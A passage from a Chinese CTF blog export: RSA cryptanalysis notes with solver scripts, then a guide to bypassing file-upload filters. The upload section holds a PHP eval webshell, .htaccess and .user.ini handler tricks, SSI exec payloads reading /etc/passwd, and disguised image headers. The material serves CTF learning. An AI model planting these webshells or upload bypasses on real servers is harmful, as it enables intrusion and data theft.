$\\mathbf{x}’,\\mathbf{y}’$。同样可以通过对如下矩阵使用LLL定理得到对应的规约基： $\\begin{pmatrix} k’b_{1,1} &amp; \\cdots &amp; k’b_{l-2,1} &amp; 1 &amp; &amp; 0 \\newline \\vdots&amp; &amp; \\vdots &amp; &amp; \\ddots &amp; \\newline k’b_{1,l} &amp; \\cdots &amp; k’b_{l-2,l}&amp; 0 &amp; &amp; 1 \\end{pmatrix}$ 同步骤2，保留计算出来的向量的最后 $l$ 个元素； 将所有长度不超过 $\\sqrt{lN}$ 的并在 $(L’)^{\\perp}$ 内的向量 $\\mathbf{z}=a \\mathbf{x}’+b \\mathbf{y}’$ 列举出来，对符合条件的向量 $\\mathbf{z}$，计算出 $\\gcd(\\mathbf{v}-\\mathbf{z},N)$，可以得出 $N$ 中任何可能的素因子。 12345678910111213141516171819202122232425262728from tqdm import tqdmimport gmpy2,sysdef orthogonal_lattice(B): LB = B.transpose().left_kernel(basis=&quot;LLL&quot;).basis_matrix() return LB cs = []s = []l = 6v = []for i in range(len(cs_)): v.append(int(crt([s_[i], cs_[i]], [n, N]))) v = vector(ZZ, v)Lv = orthogonal_lattice(Matrix(v))L1 = orthogonal_lattice(Lv.submatrix(0, 0, l-2, l))x, y = L1for a in tqdm(range(333)): for b in tqdm(range(333)): z = a*x+b*y for each in (v-z): tmp = gcd(each,n) if tmp&gt;1: p = tmp print(p) sys.exit() 参考： Modulus Fault Attacks Against RSA-CRT Signatures 2022巅峰极客 - Learning with Fault ​ 其他特别情形 多素数因子（Multi-prime RSA）$n=p_1^{k_1}p_2^{k_2}\\cdots p_m^{k_m} \\\\ \\Rightarrow \\begin{eqnarray}\\varphi(n) &amp;=&amp;\\varphi(p_1^{k_1})\\varphi(p_2^{k_2}) \\cdots \\varphi(p_m^{k_m}) \\\\ &amp;=&amp;(p_1^{k_1-1}\\cdot(p_1-1))(p_2^{k_2-1}\\cdot(p_2-1)) \\cdots (p_m^{k_m-1}\\cdot(p_m-1)) \\end{eqnarray}$ ​ next_prime() 根据素数定理，素数的平均间隔为：$\\cfrac{x}{\\pi(x)} \\approx \\ln(x)$，因此常见的下一个素数比当前素数大一点，一般不会超过1500。 变种1：$n=p \\cdot q \\cdot \\text{nextprime}(p) \\cdot \\text{nextprime}(q)$ 费马因式分解。 ​ 给 e,p,c $c \\equiv m^e \\pmod n \\\\\\Leftrightarrow c_1 \\equiv c \\pmod p \\equiv m^e \\pmod p$ 令 $ed_1 \\equiv 1 \\pmod {(p-1)}$，有 $m \\equiv c^d \\pmod n \\equiv c_1^{d_1} \\pmod p$。 ​ 给 e,d,modinv(q,p),c已知：$p,q$ 同比特位数。 令 $cf=q^{-1} \\bmod p$，有 $q\\cdot cf=1 \\pmod p$。 $ed=1+k(p-1)(q-1)$， 比较比特位数，$k$ 与 $e$ 同长，可爆破 $k$，得 $\\varphi(n)=(p-1)(q-1)=\\cfrac{ed-1}{k}$； 上式 $\\varphi(n) =(p-1)(q-1) \\pmod p=-(q-1) \\pmod p$， 结合 $q\\cdot cf=1 \\pmod p$，即 $q\\cdot cf-1=0 \\pmod p$， 联立： $\\begin{eqnarray} \\varphi(n)&amp;=&amp;(p-1)(q-1)\\\\&amp;=&amp;pq-p-q+1\\\\&amp;=&amp;n-p-q+1 \\end{eqnarray}$ $\\begin{eqnarray} cf\\cdot \\varphi(n)&amp;=&amp;cf\\cdot(n-p-q+1)\\\\&amp;=&amp;cf\\cdot n-cf\\cdot p-cf\\cdot q+cf \\end{eqnarray}$ $\\begin{eqnarray} cf\\cdot \\varphi(n) \\bmod p&amp;=&amp;(cf\\cdot n-cf\\cdot p-cf\\cdot q+cf) \\bmod p\\\\&amp;=&amp;0-0-(cf\\cdot q)+cf \\bmod p\\\\&amp;=&amp;-1+cf \\bmod p \\end{eqnarray}$ 有 $1+cf\\cdot \\varphi(n)-cf=0\\pmod p$， 即$x=1+cf\\cdot \\varphi(n)-cf$ 能被 $p$ 整除； 由费马小定理，存在 $r$ 满足 $r^{p-1}=1 \\pmod p$， $\\begin{eqnarray}r^{\\varphi(n)}&amp;=&amp;(r^{(p-1)})^{(q-1)}\\\\&amp;=&amp;1^{(q-1)} \\pmod p\\\\&amp;=&amp;1 \\pmod p \\end{eqnarray}$， 因对于任意 $r,k_1,k_2$，当 $k_2$ 为 $k_1$ 因子时，$r \\bmod k_2=(r \\bmod k_1) \\bmod k_2$， 故 $r^{\\varphi(n)} \\bmod p=(r^{\\varphi(n)} \\bmod x) \\bmod p=1 \\bmod p=kp$， 已知 $\\varphi(n)$，由 $(r^{\\varphi(n)} \\bmod x) \\bmod p=kp$ 可得到多组 $p$ 的乘积，计算 $\\gcd$ 可得到 $p$； 由 $q\\cdot cf=1 \\pmod p$ 求模逆可得 $q$，再用 $c$ 计算出 $m$。 参考：TSG CTF 2020 - Modulus Amittendus ​ gcd(e,φ(n)) ≠ 1$\\gcd(e,\\varphi(n))\\neq 1$ 时，$e$ 与 $\\varphi(n)$ 不互素， $m^e \\equiv (m^{\\gcd(e,\\varphi(n))})^{\\frac{e}{\\gcd(e,\\varphi(n))}} \\equiv c \\pmod n$，计算 $\\frac{e}{\\gcd(e,\\varphi(n))}$ 的模逆 $d’$， 则 $c^{d’}\\equiv m^{\\gcd(e,\\varphi(n))}\\pmod n$。 当 $\\gcd(e,\\varphi(n))$ 较小时，可以直接对 $c$ 开根，有两种情况： $m^e = c&lt;n$，这种情况直接对 $c$ 开 $e$ 次方即可； $m^e = c&gt;n$，这种情况需要在有限域下对 $c$ 开方，一般先计算 $c_p=c \\bmod p$，$c_q=c \\bmod q$，分别求出 $c_p,c_q$ 在 $c$ 下的 $e$ 次根（可能有多个），然后使用CRT遍历所有组合，分别check得出明文。 当 $\\gcd(e,\\varphi(n))$ 较大时，求 $p,q$ 的 $e$ 次根步骤需要替换为一些有限域开根的高效算法（如AMM算法等）进行计算。 参考： De1CTF2019 - Baby RSA 0ctf 2016 - RSA? ​ e|(p-1), e|(q-1)上面的 $\\gcd(e,\\varphi(n))\\neq 1$ 情况不针对 $\\gcd(e,\\varphi(n))= e$，这里对 $e\\mid (p-1),e\\mid (q-1)$ 的特殊情况进行讨论。 解题思路即求解 $m \\bmod p$ 和 $m \\bmod q$ ，再通过CRT还原 $m \\bmod n$。主要难点则是在 $\\text{GF}(p)$ 上求 $e$ 次根。 在有限域上求r-th root有两个常见算法（Adleman-Manders-Miller algorithm和Cipolla-Lehmer algorithm），Namhun Koo提出一种更具一般性的开根算法，且在 $s$ 足够小的时候更高效（$r^{s}\\mid (p-1),r^{s}\\nmid (p-1)$）。 ★参考：NCTF 2019 - easyRSA （Adleman-Manders-Miller rth Root Extraction Method） 本题则为 $e$ 和 $p-1$ （或 $q-1$）的最大公约数就是 $e$ 本身，也就是说 $e\\mid (p-1)$，只有对 $c$ 开 $e$ 次方根才行。 可以将同余方程 $m^e \\equiv c \\pmod n$ 化成 $\\begin{cases} m^e \\equiv c \\pmod p \\\\ m^e \\equiv c \\pmod q \\end{cases}$ 然后分别在 $\\text{GF}(p)$ 和 $\\text{GF}(q)$ 上对 $c$ 开 $e$ 次方根，再用CRT组合一下即可得到在 $\\bmod n$ 下的解。 问题是，如何在有限域内开根？ 这里 $e$ 与 $p-1$ 和 $q-1$ 都不互素，不能简单地求个逆元就完事。 这种情况下，开平方根可以用Tonelli–Shanks algorithm，Wiki说这个算法可以扩展到开n次方根。 在这篇paper里给出了具体的算法：Adleman-Manders-Miller rth Root Extraction Method。 这个算法只能开出一个根，实际上开 $e$ 次方，最多会有 $e$ 个根（这题的情况下有0x1337个根）。 如何找到其他根？ StackOverflow – Cube root modulo P 给出了方法。 如何找到所有的primitive 0x1337th root of 1? StackExchange – Finding the n-th root of unity in a finite field 给出了方法。 Exploit（以 e=0x1337​ 为例） 先用Adleman-Manders-Miller rth Root Extraction Method在 $\\text{GF}(p)$ 和 $\\text{GF}(q)$ 上对 $c$ 开 $e$ 次方根，分别得到一个解。大概不到10秒。 然后去找到所有的0x1336个primitive nth root of 1，乘以上面那个解，得到所有的0x1337个解。大概1分钟。 再用CRT对 $\\text{GF}(p)$ 和 $\\text{GF}(q)$ 上的两组0x1337个解组合成 $\\bmod n$ 下的解，可以得到0x1337**2=24196561个 $\\bmod n$ 的解。最后能通过check()的即为flag。大概十几分钟。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#脚本1#Sageimport randomimport time# About 3 seconds to rundef AMM(o, r, q): start = time.time() print(&#x27;\\n----------------------------------------------------------------------------------&#x27;) print(&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;) print(&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;.format(r, o, q)) g = GF(q) o = g(o) p = g(random.randint(1, q)) while p ^ ((q-1) // r) == 1: p = g(random.randint(1, q)) print(&#x27;[+] Find p:&#123;&#125;&#x27;.format(p)) t = 0 s = q - 1 while s % r == 0: t += 1 s = s // r print(&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;.format(s, t)) k = 1 while (k * s + 1) % r != 0: k += 1 alp = (k * s + 1) // r print(&#x27;[+] Find alp:&#123;&#125;&#x27;.format(alp)) a = p ^ (r**(t-1) * s) b = o ^ (r*alp - 1) c = p ^ s h = 1 for i in range(1, t): d = b ^ (r^(t-1-i)) if d == 1: j = 0 else: print(&#x27;[+] Calculating DLP...&#x27;) j = - discrete_log(a, d) print(&#x27;[+] Finish DLP...&#x27;) b = b * (c^r)^j h = h * c^j c = c ^ r result = o^alp * h end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) print(&#x27;Find one solution: &#123;&#125;&#x27;.format(result)) return resultdef findAllPRoot(p, e): print(&quot;Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;.&quot;.format(e, p)) start = time.time() proot = set() while len(proot) &lt; e: proot.add(pow(random.randint(2, p-1), (p-1)//e, p)) end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) return prootdef findAllSolutions(mp, proot, cp, p): print(&quot;Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.&quot;.format(e, cp, p)) start = time.time() all_mp = set() for root in proot: mp2 = mp * root % p assert(pow(mp2, e, p) == cp) all_mp.add(mp2) end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) return all_mpc = p = q = e = 0x1337cp = c % pcq = c % qmp = AMM(cp, e, p)mq = AMM(cq, e, q)p_proot = findAllPRoot(p, e)q_proot = findAllPRoot(q, e)mps = findAllSolutions(mp, p_proot, cp, p)mqs = findAllSolutions(mq, q_proot, cq, q)print(mps, mqs)def check(m): h = m.hex() if len(h) &amp; 1: return False if bytes.fromhex(h).startswith(b&#x27;NCTF&#x27;): print(bytes.fromhex(h)) return True else: return False# About 16 mins to run 0x1337^2 == 24196561 times CRTstart = time.time()print(&#x27;Start CRT...&#x27;)for mpp in mps: for mqq in mqs: solution = CRT_list([int(mpp), int(mqq)], [p, q]) if check(solution): print(solution) print(time.time() - start)end = time.time()print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) 12345678910111213141516171819202122#脚本2#Sagec = 346925245648012783854132941104554194717281878370806475831055718275298366664505658836564073456294047402009856656647760p = 21122913513992623721920275602985463699928507831138027q = 16471885912035642894544190467774867069446937372970845578732298073e = 239P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=&#x27;NTL&#x27;)f=a^e-cmps=f.monic().roots()P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=&#x27;NTL&#x27;)g=a^e-cmqs=g.monic().roots()for mpp in mps: x=mpp[0] for mqq in mqs: y=mqq[0] solution = hex(CRT_list([int(x), int(y)], [p, q]))[2:] if solution.startswith(&#x27;666c&#x27;): print(solution) ​ SMUPE 问题（不同N,e加密线性关系明文）a system of univariate polynomial equations problem = 一元多项式方程组求解问题 定义 $k$ 是一个整数，$N$ 为满足RSA算法的模数，$\\delta$ 是多项式的阶。有 $N_i&lt;N_{i+1},\\delta_i \\in N\\quad(i=1,2,\\cdots,k)$ 多项式方程组表示如下, 目的是求解 $x$： $\\begin{cases} f_1(x)\\equiv 0 \\pmod {N_1}\\newline f_2(x)\\equiv 0 \\pmod {N_2} \\newline {\\vdots} \\newline f_k(x)\\equiv 0 \\pmod {N_k} \\end{cases}$ 求解条件 Alexander May, Maike Ritzenhofent提出一种求解方法，简单地说当多项式的阶 $\\delta$ 满足以下情况时可解（$\\delta$ 是多项式的阶）： $\\sum\\limits_{i=1}^k \\cfrac{1}{\\delta_i} \\geq 1$ 具体描述： 令 $(f_i,\\delta_i,N_i) \\quad(i=1,2,\\cdots,k)$ 作为SMUPE问题的首一多项式组， 定义 $M=\\prod\\limits_{i=1}^k N_i^{\\frac{\\delta}{\\delta_i}},\\delta=\\text{lcm}(\\delta_i) \\quad (i=1,2,\\cdots,k)$ 则SMUPE问题可以在 $O(\\delta^6\\cdot \\log_2M)$ 复杂度解决。 参考：2019红帽杯 - 精明的Alice ​ 反素数（emirp数）已知：$q=\\text{reverse_x}(p)$，$\\text{x}$ 为进制数。 爆破思路类似RSA parity oracle。$p,q$ 是bit翻转关系，已知 $p$ 最低的 $k$ 位，则已知 $q$ 最高的 $k$ 位。 假设已知 $k$ 位的 $p,q$，记为 $ph,qh$，利用不等式 $ph\\cdot qh\\cdot 2^{1024-2k}&lt;=n&lt;(ph+1)\\cdot(qh+1)\\cdot 2^{1024-2k}$ ， 逐位向低地址爆破，不断收缩不等式的范围，最终可求得 $n$ 值。 参考： ASIS 2015 Finals: RSASR Midnight Sun CTF 2020 Quals RoarCTF 2020 - Reverse 1234567891011121314151617181920212223242526272829#python2#x=10n = 6528060431134312098979986223024580864611046696815854430382374273411300418237131352745191078493977589108885811759425485490763751348287769344905469074809576433677010568815441304709680418296164156409562517530459274464091661561004894449297362571476259873657346997681362092440259333170797190642839587892066761627543def t(a, b, k): # sqrt(n) has 155 digits, so we need to figure out 77 digits on each side if k == 77: if a*b == n: print a, b return for i in xrange(10): for j in xrange(10): # we try to guess the last not-already-guessed digits of both primes a1 = a + i*(10**k) + j*(10**(154-k)) b1 = b + j*(10**k) + i*(10**(154-k)) if a1*b1 &gt; n: # a1 and b1 are too large continue if (a1+(10**(154-k)))*(b1+(10**(154-k))) &lt; n: # a1 and b1 are too small continue if ((a1*b1)%(10**(k+1))) != (n%(10**(k+1))): # The last digits of a1*b1 (which won&#x27;t change later) doesn&#x27;t match n continue # this a1 and b1 seem to be a possible match, try to guess remaining digits t(a1, b1, k+1)# the primes have odd number of digits (155), so we try all possible middle digits (it simplifies the code)for i in xrange(10): t(i*(10**77), i*(10**77), 0) ​ 4p-1 method对使用一类特定素数乘积的模数的分解。 当一类特殊的素数用在 RSA 模数中时，可以轻易的将该素数从 $n$ 中分解出来。由于这一类素数都形如 $4p−1=Ds^2$，因此又被称为 4p-1 method。此外，有些人也会将其视为 RSA 的后门之一，称之为 RSA backdoor。 QiCheng Prime $Ds=\\{3,11,19,43,67,163\\}$ 12345678910111213141516171819202122232425262728import syssys.setrecursionlimit(10^6)def QiCheng(n): R = Integers(n) attempts = 20 js = [0, (-2^5)^3, (-2^5*3)^3, (-2^5*3*5)^3, (-2^5*3*5*11)^3, (-2^6*3*5*23*29)^3] for _ in range(attempts): for j in js: if j == 0: a = R.random_element() E = EllipticCurve([0, a]) else: a = R(j)/(R(1728)-R(j)) c = R.random_element() E = EllipticCurve([3*a*c^2, 2*a*c^3]) x = R.random_element() z = E.division_polynomial(n, x) g = gcd(z, n) if g &gt; 1: return gn = p = int(QiCheng(Integer(n))) Masaaki Shirase &amp; Vladimir Sedlacek Improvement 更多 $Ds$ 值。 CM-based factorization 参考： 浅谈 QiCheng Prime NCTF 2020 - RSA_revenge CryptoHack Challenge - RSA Backdoor Viability ​ Common Prime RSA情形：$\\gcd(p-1,q-1)=g$ 分解的n方法有四种： （1）修改Pollard’s rho方法分解n； （2）知道a、b的值分解n； （3）知道g的值分解n； （4）分解N-1。 12345678910111213141516171819202122232425# Pollard’s rhofrom Crypto.Util.number import *import gmpy2def f(x, n): return (pow(x, n - 1, n) + 3) % ndef rho(n): i = 1 print &#x27;Factorizing&#x27; while True: x1 = getRandomRange(2, n) x2 = f(x1, n) j = 1 while True: p = gmpy2.gcd(abs(x1 - x2), n) if p == n: break elif p &gt; 1 and isPrime(p): print &#x27;Found!&#x27; return (p, n // p) else: x1 = f(x1, n) x2 = f(f(x2, n), n) j += 1 i += 1 ​ RSA Padding Oracle AttackRSA PKCS #1 v1.5 填充用于需要RSA加密的信息，为了加密K，消息首先被0x00、一些随机字节和0x00 0x02填充，随机字节的选择方式是为了让填充的信息达到特定的块长度（1024、2048或4096位）。 PKCS #1 v1.5 标准中可以伪造RSA签名。 Bleichenbacher攻击 可以识别在 0x00 02 后以明文开始的密文信息，然后进行Padding Oracle攻击来解密预主密钥，进一步可以取得SSL的会话密钥。 充分利用 0x00 02 开头的特性，假设攻击者获得密文 $C_0$，想恢复出明文 $M_0$。攻击方法是通过向服务器多次发送修改后的密文，分析响应是正确还是错误来确定修改结果，进而解密信息。 如果收到正确，则表示是 0x00 02 开头，那么 $2B \\lt m \\lt 3B-1$，且 $B=2^{8(L-2)}$，而且基于RSA加密的延展性，可得 $C=(C_0S)\\bmod N=(M_0S)^e \\bmod N$ ，攻击者可用 $C$ 进行查询，如果收到错误则增加 $S$，并重复上一步骤。 攻击者可以利用 0x00 02 大幅度减少可能的取值，$2B \\lt M_0S-rN \\lt 3B$，因此攻击者能够降低范围$\\cfrac{2B+rN}{S} \\lt M_0 \\lt \\cfrac{3B+rN}{S}$，然后迭代选择 $S$，进行Oracle查询，计算新的 $r$ 值，攻击者便可以不断缩小包含 $M_0$ 的范围，不断重复直到最后只剩唯一解。 参考： Chosen Ciphertext Attacks Against Protocols Based on the RSA Encryption Standard PKCS #1 Bleichenbachers “Million Message Attack” on RSA Pwnhub - pkcs_fix ​ Return of Coppersmith’s attack (ROCA)CVE-2017-15361 形如 $p=kM+(65537^a \\bmod M)$ 生成素数的RSA系统，$M$ 是前 $n$ 个连续素数的乘积，$n$ 是仅取决于所需密钥大小的常数。 https://github.com/jvdsn/crypto-attacks/blob/master/attacks/factorization/roca.py https://github.com/FlorianPicca/ROCA ​ PEM密钥由-----BEGIN &lt;TAG&gt;-----开头，-----END &lt;TAG&gt;-----结尾，中间是Base64编码的一串二进制，每64个字母（即解码后的48bytes）有一个换行。中间的Base64解码后是一串遵循ASN.1协议的DER编码，简单来说可以看成一种序列化，把一个结构体中的整数、字串等编码成一个方便传输的二进制。 生成代码： 1234567891011from Crypto.PublicKey import RSArsa = RSA.generate(1024)pk = rsa.publickey().exportKey()sk = rsa.exportKey()with open (&#x27;./pub.pem&#x27;, &#x27;wb&#x27;) as f: f.write(pk)with open (&#x27;./priv.pem&#x27;, &#x27;wb&#x27;) as f: f.write(sk) RSA私钥123-----BEGIN RSA PRIVATE KEY-----...Base64 encoded key...-----END RSA PRIVATE KEY----- RFC3447定义： 123456789101112131415RSAPrivateKey ::= SEQUENCE &#123; version Version, modulus INTEGER, -- n publicExponent INTEGER, -- e privateExponent INTEGER, -- d prime1 INTEGER, -- p prime2 INTEGER, -- q exponent1 INTEGER, -- d mod (p-1) exponent2 INTEGER, -- d mod (q-1) coefficient INTEGER, -- (inverse of q) mod p otherPrimeInfos OtherPrimeInfos OPTIONAL&#125;Version ::= INTEGER &#123; two-prime(0), multi(1) &#125; (CONSTRAINED BY &#123;-- version must be multi if otherPrimeInfos present --&#125;) 例： 13082025d02010002818100a0d154d5bf97c40f7797b44819d09c608fa4b5c38e70d83bc13267138c6eff4c1aacefe3ddb571e1b41d911c7ab6136cf90493189563450e1f4270cabbc4207c54c4da7b84a20311cfbbabe82b9fe60bdf48a08d57839d0cdf9464d84262bcc06bc308095a6987f60ad07d669a312b5a7e4133213788eecf25863248b91349ef02030100010281800f8270c496903bf3e3ec4912450f15edc81cb1fcf4b154615aee11fbd428e64d402b5a8d66d5f770358f3e6df935b324e8d5349c83d7c992a5982249a31734acb1db19c4c8d829267514bc1ef7bbfbe242d4350f67a002a56d33e56d1a94adc71c68f020dc39ab7d0064c111b164e26ba0698dc94a03cdfd516ffd966e877949024100ca97e49c058237f96e99118ce383f91912cba1163de9236181ff754ef3ef1a260fac8d2d9aee866d51a8b6836983b05cf850e786289b6859925bc8695fc67c47024100cb3630aafffcb29607f0833dc7f05c143ee92fadfe975da4cf6719e71226bee72562e8631328a25d7351507a8d43c1295ab6ea242b60a28b109233a983f4211902401b4a32a541a8b4d988a85dd0d8a4e25d1a470bbfef3f0461121dd3337b706dd94aab37a9390180622169d48c071e921733ebd204245c2ac6460ccf0642bc7de90241008d9f44a7c823eaaa58fa2bdd20bcc8cf6b50c463f4acb51ca956e75c7ceff7d7cbdc74aca7ab880cacd39cccec2aae320e00b0896899be6e40ac43c8fe2763f1024100c67ca6d988f53abea82159431a146512a8d942978d4a8f83f2d426f1095e3bf1b5b9b8b1ccbbad2a31c6401880447a45f5e0790269061ac13b5f68f1777d7f07 30是Sequence的tag，82是指接下来后两个bytes是这个Sequence的长度，即0x025d个bytes，也就是剩下全部都是；接着的020100就是整数0，其中02是整数的tag，01是这个整数占1byte，00是value同样的方法也可以解02818100a0...和后面其他整数，拆分： 1234567891011121314151617181920212223242526272829303082025d # Begin Sequence: len=0x025d0201 # Version: (len=0x01)00028181 # n: (len=0x81)00a0d154d5bf97c40f7797b44819d09c608fa4b5c38e70d83bc13267138c6eff4c1aacefe3ddb571e1b41d911c7ab6136cf90493189563450e1f4270cabbc4207c54c4da7b84a20311cfbbabe82b9fe60bdf48a08d57839d0cdf9464d84262bcc06bc308095a6987f60ad07d669a312b5a7e4133213788eecf25863248b91349ef0203 # e: (len=0x03)010001028180 # d: (len=0x80)0f8270c496903bf3e3ec4912450f15edc81cb1fcf4b154615aee11fbd428e64d402b5a8d66d5f770358f3e6df935b324e8d5349c83d7c992a5982249a31734acb1db19c4c8d829267514bc1ef7bbfbe242d4350f67a002a56d33e56d1a94adc71c68f020dc39ab7d0064c111b164e26ba0698dc94a03cdfd516ffd966e8779490241 # p: (len=0x41)00ca97e49c058237f96e99118ce383f91912cba1163de9236181ff754ef3ef1a260fac8d2d9aee866d51a8b6836983b05cf850e786289b6859925bc8695fc67c470241 # q: (len=0x41)00cb3630aafffcb29607f0833dc7f05c143ee92fadfe975da4cf6719e71226bee72562e8631328a25d7351507a8d43c1295ab6ea242b60a28b109233a983f421190240 # d mod (p-1): (len=0x40)1b4a32a541a8b4d988a85dd0d8a4e25d1a470bbfef3f0461121dd3337b706dd94aab37a9390180622169d48c071e921733ebd204245c2ac6460ccf0642bc7de90241 # d mod (q-1): (len=0x41)008d9f44a7c823eaaa58fa2bdd20bcc8cf6b50c463f4acb51ca956e75c7ceff7d7cbdc74aca7ab880cacd39cccec2aae320e00b0896899be6e40ac43c8fe2763f10241 # (inverse of q) mod p: (len=0x41)00c67ca6d988f53abea82159431a146512a8d942978d4a8f83f2d426f1095e3bf1b5b9b8b1ccbbad2a31c6401880447a45f5e0790269061ac13b5f68f1777d7f07 # End Sequence RSA公钥123-----BEGIN PUBLIC KEY-----...Base64 encoded key...-----END PUBLIC KEY----- 例： 130819f300d06092a864886f70d010101050003818d0030818902818100a0d154d5bf97c40f7797b44819d09c608fa4b5c38e70d83bc13267138c6eff4c1aacefe3ddb571e1b41d911c7ab6136cf90493189563450e1f4270cabbc4207c54c4da7b84a20311cfbbabe82b9fe60bdf48a08d57839d0cdf9464d84262bcc06bc308095a6987f60ad07d669a312b5a7e4133213788eecf25863248b91349ef0203010001 拆分： 1234567891011121314151617181920212223242530819f # Begin Main Sequence: len=0x9f300d # Begin Sub1 Sequence: len=0x0d0609 # algo_oid: (1.2.840.113549.1.1.1 - PKCSv1.2)2a864886f70d0101010500 # params: (null) # End Sub1 Sequence03818d # BitString: len=0x8d ([n, e])00308189 # Begin Sub2 Sequence: len=0x89028181 # n:00a0d154d5bf97c40f7797b44819d09c608fa4b5c38e70d83bc13267138c6eff4c1aacefe3ddb571e1b41d911c7ab6136cf90493189563450e1f4270cabbc4207c54c4da7b84a20311cfbbabe82b9fe60bdf48a08d57839d0cdf9464d84262bcc06bc308095a6987f60ad07d669a312b5a7e4133213788eecf25863248b91349ef0203 # e:010001 # End Sub2 Sequence # End Main Sequence 参考手撕PEM密钥 ​ 详细原理二十年以来对 RSA 密码系统攻击综述 CTF Wiki - RSA 0xDktb’s Blog RSA常见攻击方法 Cryptanalysis of RSA and It’s Variants","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://lazzzaro.github.io/tags/RSA/"}],"author":"Lazzaro"},{"title":"文件上传","slug":"web-文件上传","date":"2020-05-06T13:13:00.000Z","updated":"2022-10-17T16:52:13.801Z","comments":true,"path":"2020/05/06/web-文件上传/","link":"","permalink":"https://lazzzaro.github.io/2020/05/06/web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"","text":"​ 绕过姿势客户端校验 禁用JS 抓包改包bp抓包后改后缀名 ​ 服务端校验MIME类型检测MIME类型在html文件中使用content-type属性表示。 常见文件名对应的MIME类型： gif —&gt; image/gif，png —&gt; image/png，jpg —&gt; image/jpg，js —&gt; text/javascript，htm/html —&gt; text/html ​ 后缀名黑名单校验绕过方法 大小写绕过，例如Php、PhP 利用黑名单中没有的，但是又能够被解析的后缀名，例如php、php3、php4、php5、php7、pht、phtml、phps 00截断 注：需要magic_quotes_gpc=Off，基于一个组合逻辑漏洞 在第一个后缀名后加一个空格(0x20)，使用bp-&gt;repeater-&gt;hex，将其改成0x00 .htaccess文件上传解析 该文件可以理解为Apache的分布式配置文件，在一个特定的文档中放置，以作用于此目录及其所有子目录。管理员可以通过Apache的AllowOverride指令来设置/etc/apache2/apache2.conf，默认是NONE，需要为ALL 123&lt;FilesMatch &quot;xxx.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMacth&gt; 不能写&lt;?时使用伪协议： 12AddType application/x-httpd-php .xxxphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.xxx&quot; 不能出现某些关键字（如ph或php）时，使用反斜杠（\\）拼接绕过，并开启短标签： 1234567AddType application/x-httpd-p\\hp .jpgp\\hp_value au\\to_append_file &quot;p\\hp://filter/convert.base64-decode/resource=shell.jpg&quot;p\\hp_value short_open_tag 1 绕过 exif_imagetype() 读取一个图像的第一个字节并检查其签名： 12345678方法1：#define width 1337#define height 1337方法2：在.htaccess前添加\\x00\\x00\\x8a\\x39\\x8a\\x39(要在十六进制编辑器中添加，或者使用python的bytes类型)\\x00\\x00\\x8a\\x39\\x8a\\x39 是wbmp文件的文件头.htaccess中以\\x00开头的同样也是注释符，所以不会影响.htaccess 参考： .htaccess的使用技巧总结 .user.ini上传 条件： a. 服务器脚本语言为PHP b. 服务器使用CGI／FastCGI模式 c. 上传目录下要有可执行的php文件 实例： 上传.user.ini绕过黑名单检验 123GIF89a //绕过exif_imagetype()auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。auto_append_file=a.jpg //解析后进行包含 优势： 跟.htaccess后门比，适用范围更广，nginx/apache/IIS都有效，而.htaccess只适用于apache 超长文件名截断上传 windows - 258byte | linux - 4096byte 使用./或. shtml（SSI注入） 当Web服务器为Apache和IIS（支持SSI功能的服务器）且开启了SSI与CGI支持 &lt;!--#exec cmd=&quot;dir /&quot;--&gt; &lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt; ​ 后缀名白名单校验 配合Apache的解析缺陷 Apache的解析漏洞主要特性是从后面开始检查后缀，按最后一个合法后缀 ​ 内容头校验 绕过方法 在恶意脚本前加上允许上传文件的头标识 如添加GIF头： 12GIF89a&lt;?php phpinfo(); ?&gt; ​ 竞争上传 情景 文件上传后，检测是否合法，不合法就删除 利用方式 在删除前访问到上传的文件 12345&lt;?php$file = &#x27;web.php&#x27;;$shell = &#x27;&lt;?php eval($_POST[&quot;key&quot;])?&gt;&#x27;;file_put_contents($file,$shell);?&gt; 例子 https://github.com/backlion/demo/blob/master/lfi_phpinfo.py ​ php崩溃导致tmp文件保留当存在include的时候，传入file=php://filter/string.strip_tags/resource=/etc/passwd会导致Segment Fault，这样如果在此同时上传文件，那么临时文件就会被保存在/tmp目录，不会被删除。但是这时还需要知道/tmp目录下的文件名。 ​ 过滤&lt;?或php js标签绕过 需要php小于7.0 12345&lt;script language=&quot;PHP&quot;&gt;$fh=fopen(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;),&#x27;r&#x27;);echo fread($fh,filesize(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;)));fclose($fh);&lt;/script&gt; PHP短标签 开启短标签即short_open_tag=on时，可以使用&lt;?=$_ ?&gt;输出变量，在PHP 5.4 之后默认支持 ​ phar反序列化漏洞见phar反序列化。 ​ 二次渲染图片马的三种常用图像格式gif，png，jpg。 简单图片马 copy 1.jpg/b + 1.php/a 2.jpg 二次渲染绕过 gif 对于gif图片，gif图片的特点是无损（修改图片后，图片质量几乎没有损失），可以对比上传前后图片的内容字节，在渲染后不会被修改的部分插入木马。对比工具可以使用burp，也可以使用010编辑器。 png 对于png图片，修改难度大一点，使用一个脚本来生成，原理是通过真实像素的二进制解析写入数据段。 12345678910111213141516171819202122&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 